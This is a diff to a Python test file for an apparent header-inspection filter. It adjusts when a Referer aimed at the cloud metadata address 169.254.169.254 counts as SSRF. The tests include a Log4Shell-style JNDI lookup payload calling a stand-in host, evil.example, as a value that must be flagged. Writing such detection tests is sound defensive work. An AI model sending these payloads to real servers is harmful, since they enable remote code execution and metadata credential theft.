@@ -67,7 +67,11 @@ async def test_a_built_in_default_header_the_operator_also_lists_is_fully_skippe
 
 
 async def test_a_built_in_default_header_skips_ssrf_only() -> None:
-    assert await _flagged({"referer": "http://169.254.169.254/"}) is False
+    assert (
+        await _flagged({"referer": "http://169.254.169.254/", "host": "localhost:8000"})
+        is False
+    )
+    assert await _flagged({"referer": "http://169.254.169.254/"}) is True
     assert await _flagged({"referer": "${jndi:ldap://evil.example/a}"}) is True
 
 
